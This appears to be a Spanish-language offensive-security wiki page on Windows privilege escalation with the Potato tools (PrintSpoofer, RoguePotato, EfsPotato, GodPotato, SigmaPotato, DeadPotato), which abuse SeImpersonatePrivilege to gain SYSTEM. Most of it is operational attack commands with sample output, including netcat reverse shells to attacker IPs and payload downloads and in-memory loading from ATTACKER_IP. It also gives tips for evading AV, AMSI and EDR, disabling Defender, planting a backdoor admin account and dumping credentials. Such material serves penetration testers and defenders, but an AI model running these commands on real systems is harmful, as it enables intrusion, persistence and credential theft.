# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato no funciona** en Windows Server 2019 ni en Windows 10 build 1809 y posteriores. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** pueden usarse para **aprovechar los mismos privilegios y obtener acceso con nivel `NT AUTHORITY\SYSTEM`**. Esta [publicación del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que puede usarse para abusar de los privilegios de suplantación en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Una alternativa moderna que se mantiene con frecuencia en 2024–2025 es SigmaPotato (un fork de GodPotato), que añade el uso de reflexión de .NET en memoria y compatibilidad ampliada con sistemas operativos. Consulta el uso rápido más abajo y el repo en References.

Páginas relacionadas para obtener contexto y conocer técnicas manuales:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos y problemas habituales

Todas las técnicas siguientes dependen de abusar de un servicio privilegiado capaz de suplantación desde un contexto que tenga uno de estos privilegios:

- SeImpersonatePrivilege (el más común) o SeAssignPrimaryTokenPrivilege
- No se requiere integridad alta si el token ya tiene SeImpersonatePrivilege (lo habitual en muchas cuentas de servicio, como IIS AppPool, MSSQL, etc.)

Comprueba rápidamente los privilegios:

```cmd
whoami /priv | findstr /i impersonate
```

Notas operativas:

- Si tu shell se ejecuta con un token restringido que carece de SeImpersonatePrivilege (común en Local Service/Network Service en algunos contextos), recupera los privilegios predeterminados de la cuenta con FullPowers y luego ejecuta un Potato. Ejemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Un token de proceso puede tener menos privilegios que otro token de la misma cuenta de servicio o sesión de inicio de sesión. En algunas configuraciones, un cliente de named pipe en la misma sesión puede exponer un token distinto con SeImpersonatePrivilege, pero los `RequiredPrivileges` configurados para el servicio y `whoami /priv` describen cosas diferentes y no demuestran que dicho token esté disponible. Verifica el token real antes de considerar una vía de impersonación.
- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y sea accesible a través del endpoint RPC local (spoolss). En entornos reforzados donde Spooler está deshabilitado tras PrintNightmare, es preferible usar RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiere que se pueda acceder a un OXID resolver por TCP/135. Si la salida está bloqueada, usa un redirector/port-forwarder (consulta el ejemplo de abajo). Comprueba las flags que admite la build en uso.
- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si una pipe está bloqueada, prueba otras (lsarpc, efsrpc, samr, lsass, netlogon).
- El error 0x6d3 durante RpcBindingSetAuthInfo suele indicar un servicio de autenticación RPC desconocido o no compatible; prueba otra pipe/transporte o asegúrate de que el servicio de destino esté en ejecución.
- Las forks «kitchen-sink», como DeadPotato, incluyen módulos de payload adicionales (Mimikatz/SharpHound/Defender off) que escriben en disco; espera una mayor detección por EDR en comparación con las versiones originales más ligeras.

## Demostración rápida

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notas:
- Puedes usar -i para iniciar un proceso interactivo en la consola actual o -c para ejecutar un comando de una sola línea.
- Requiere el servicio Spooler. Si está deshabilitado, esto fallará.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

En el [uso upstream](https://github.com/antonioCoco/RoguePotato#usage), `-e` proporciona el comando, `-l` selecciona el puerto del resolver local y el `-c` opcional selecciona un CLSID. Si la activación COM inicia un servicio cuya ruta del ejecutable ya se había modificado, ese servicio puede ejecutar el comando cambiado sin depender de la suplantación del token; inspecciona la configuración del servicio antes de atribuir la ejecución observada como SYSTEM a esta técnica.

Si el tráfico saliente por el puerto 135 está bloqueado, redirige el resolver OXID mediante socat en tu redirector:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato es una primitiva más reciente de abuso de COM, publicada a finales de 2022, que apunta al servicio **PrintNotify** en lugar de Spooler/BITS. El binario instancia el servidor COM de PrintNotify, sustituye un `IUnknown` falso y luego activa un callback con privilegios mediante `CreatePointerMoniker`. Cuando el servicio PrintNotify (que se ejecuta como **SYSTEM**) se conecta de vuelta, el proceso duplica el token devuelto e inicia el payload proporcionado con privilegios completos.<sup>[[13]](#references)</sup>

Notas operativas clave:

* Funciona en Windows 10/11 y Windows Server 2012–2022, siempre que el servicio Print Workflow/PrintNotify esté instalado (está presente incluso cuando Spooler, el servicio heredado, está deshabilitado tras PrintNightmare).
* Requiere que el contexto de llamada tenga **SeImpersonatePrivilege** (habitual en cuentas de servicio de IIS APPPOOL, MSSQL y tareas programadas).
* Acepta un comando directo o un modo interactivo para que puedas permanecer en la consola original. Ejemplo:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Como se basa únicamente en COM, no requiere listeners de named pipes ni redirectors externos, por lo que es un reemplazo directo en hosts donde Defender bloquea el enlace RPC de RoguePotato.

Operadores como Ink Dragon ejecutan PrintNotifyPotato inmediatamente después de obtener RCE mediante ViewState en SharePoint para pivotar del worker `w3wp.exe` a SYSTEM antes de instalar ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Consejo: Si un pipe falla o EDR lo bloquea, prueba los otros pipes compatibles:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Notas:
- Funciona en Windows 8/8.1–11 y Server 2012–2022 cuando está presente SeImpersonatePrivilege.
- Obtén el binario que coincida con el entorno de ejecución instalado (p. ej., `GodPotato-NET4.exe` en Server 2022 moderno).
- Si tu primitiva de ejecución inicial es una webshell/UI con tiempos de espera cortos, prepara el payload como script y pídele a GodPotato que lo ejecute en lugar de usar un comando inline largo.<sup>[[12]](#references)</sup>

Patrón rápido para preparar el payload desde un webroot de IIS con permisos de escritura:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato ofrece dos variantes dirigidas a objetos DCOM de servicios que usan RPC_C_IMP_LEVEL_IMPERSONATE de forma predeterminada. Compila o usa los binarios proporcionados y ejecuta tu comando:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (fork actualizado de GodPotato)

SigmaPotato añade funcionalidades modernas, como la ejecución en memoria mediante reflection de .NET y un helper de reverse shell de PowerShell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Ventajas adicionales en las compilaciones de 2024–2025 (v1.2.x):
- Flag de reverse shell integrado `--revshell` y eliminación del límite de 1024 caracteres de PowerShell, para que puedas ejecutar payloads largos que evaden AMSI de una sola vez.
- Sintaxis compatible con Reflection (`[SigmaPotato]::Main()`), además de un rudimentario truco de evasión de AV mediante `VirtualAllocExNuma()` para confundir heurísticas simples.
- `SigmaPotatoCore.exe` independiente, compilado para .NET 2.0, para entornos de PowerShell Core.

### DeadPotato (reelaboración de GodPotato de 2024 con módulos)

DeadPotato conserva la cadena de suplantación OXID/DCOM de GodPotato, pero incorpora helpers de post-exploitation para que los operadores puedan obtener SYSTEM de inmediato y realizar persistencia/recolección sin herramientas adicionales.<sup>[[15]](#references)</sup>

Módulos comunes (todos requieren SeImpersonatePrivilege):

- `-cmd "<cmd>"` — ejecutar un comando arbitrario como SYSTEM.
- `-rev <ip:port>` — reverse shell rápida.
- `-newadmin user:pass` — crear un administrador local para persistencia.
- `-mimi sam|lsa|all` — soltar y ejecutar Mimikatz para volcar credenciales (escribe en disco y genera mucho ruido).
- `-sharphound` — ejecutar la recopilación de SharpHound como SYSTEM.
- `-defender off` — desactivar la protección en tiempo real de Defender (genera mucho ruido).

Ejemplos de comandos de una línea:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Como incluye binarios adicionales, espera más alertas de AV/EDR; usa GodPotato/SigmaPotato, que son más ligeros, cuando el sigilo sea importante.

## References

- [1] [PrintSpoofer: abuso de privilegios de suplantación en Windows 10 y Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [¿Se acabó JuicyPotato? Una historia antigua: bienvenido RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers: restaurar los privilegios predeterminados de los tokens de cuentas de servicio](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — leak de NTLM de WMP → junction NTFS al webroot → RCE → FullPowers + GodPotato para obtener SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — macro de LibreOffice → webshell de IIS → GodPotato para obtener SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research: dentro de Ink Dragon: revelación de la red de retransmisión y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato: reimplementación de GodPotato con módulos post-ex integrados](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
